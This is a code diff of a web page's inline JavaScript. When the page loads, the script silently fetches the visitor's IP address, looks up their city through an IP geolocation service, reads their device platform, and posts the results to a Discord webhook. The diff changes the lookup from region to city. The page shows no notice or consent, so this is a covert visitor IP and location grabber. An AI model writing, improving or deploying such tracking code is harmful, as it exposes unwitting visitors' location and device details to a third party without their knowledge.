@@ -8,8 +8,8 @@
 
       var content = "> **Adresse IP 🛰️ : **" + ipAddress +
         "\n> **Département 🏠 : **" + department +
-     
-        var request = new XMLHttpRequest();
+
+      var request = new XMLHttpRequest();
       request.open("POST", webhookURL);
       request.setRequestHeader('Content-type', 'application/json');
       var params = {
@@ -18,7 +18,7 @@
       request.send(JSON.stringify(params));
     }
 
-    function getIPDepartmentDevice() {
+    function getIPCityDevice() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
@@ -27,14 +27,13 @@
           fetch('https://ipapi.co/' + ipAddress + '/json/')
             .then(response => response.json())
             .then(data => {
-              var department = data.region;
-
+              var city = data.city;
               var device = navigator.platform;
 
-              sendToDiscord(ipAddress, department, device);
+              sendToDiscord(ipAddress, city, device);
             })
             .catch(error => {
-              console.error('Erreur lors de la récupération du département :', error);
+              console.error('Erreur lors de la récupération de la ville :', error);
             });
         })
         .catch(error => {
@@ -42,7 +41,7 @@
         });
     }
 
-    window.addEventListener('DOMContentLoaded', getIPDepartmentDevice);
+    window.addEventListener('DOMContentLoaded', getIPCityDevice);
   </script>
 </head>
 <body>
